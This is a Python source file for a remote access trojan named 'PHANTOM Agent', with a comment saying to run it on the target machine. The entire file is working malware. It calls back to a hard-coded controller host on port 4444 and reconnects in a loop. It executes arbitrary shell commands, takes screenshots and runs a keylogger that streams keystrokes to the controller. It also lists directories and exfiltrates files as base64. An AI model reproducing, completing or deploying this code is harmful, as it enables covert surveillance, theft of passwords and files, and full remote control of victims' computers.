#!/usr/bin/env python3
# PHANTOM Agent — jalankan di mesin target
# pip install pillow pyautogui pynput psutil
import socket, subprocess, os, sys, time, threading
import base64, json, platform, getpass, struct

HOST = "192.0.2.2"
PORT = 4444

def sysinfo():
    import platform, getpass, socket
    return json.dumps({
        "host": socket.gethostname(),
        "user": getpass.getuser(),
        "os":   platform.system() + " " + platform.release(),
        "cwd":  os.getcwd(),
    })

def shell_exec(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True,
              stderr=subprocess.STDOUT, timeout=15)
        return out.decode(errors="ignore")
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {e}"

def screenshot_b64():
    try:
        import pyautogui, io
        img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[error] {e}"

def keylogger_start(sock):
    try:
        from pynput import keyboard
        buf = []
        def on_press(key):
            try: buf.append(key.char or "")
            except: buf.append(f"[{key}]")
            if len(buf) > 50:
                try: sock.send(json.dumps({"type":"keys","data":"".join(buf)}).encode() + b"\n")
                except: pass
                buf.clear()
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        return "keylogger started"
    except Exception as e:
        return f"[error] {e}"

def send(sock, data):
    msg = json.dumps(data).encode() + b"\n"
    sock.sendall(msg)

def recv(sock):
    buf = b""
    while not buf.endswith(b"\n"):
        chunk = sock.recv(4096)
        if not chunk: break
        buf += chunk
    return json.loads(buf.strip())

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            send(s, {"type": "hello", "info": json.loads(sysinfo())})
            while True:
                cmd = recv(s)
                t = cmd.get("cmd", "")
                if t == "shell":
                    out = shell_exec(cmd["data"])
                    send(s, {"type":"out","data":out})
                elif t == "screenshot":
                    send(s, {"type":"screenshot","data":screenshot_b64()})
                elif t == "keylog":
                    out = keylogger_start(s)
                    send(s, {"type":"out","data":out})
                elif t == "ls":
                    try:
                        files = os.listdir(cmd.get("data", "."))
                        send(s, {"type":"out","data":"\n".join(files)})
                    except Exception as e:
                        send(s, {"type":"out","data":str(e)})
                elif t == "cd":
                    try:
                        os.chdir(cmd["data"])
                        send(s, {"type":"out","data":f"cwd: {os.getcwd()}"})
                    except Exception as e:
                        send(s, {"type":"out","data":str(e)})
                elif t == "download":
                    try:
                        with open(cmd["data"], "rb") as f:
                            data = base64.b64encode(f.read()).decode()
                        send(s, {"type":"file","name":cmd["data"],"data":data})
                    except Exception as e:
                        send(s, {"type":"out","data":str(e)})
                elif t == "sysinfo":
                    send(s, {"type":"out","data":sysinfo()})
                elif t == "exit":
                    break
            s.close()
        except:
            time.sleep(10)

connect()
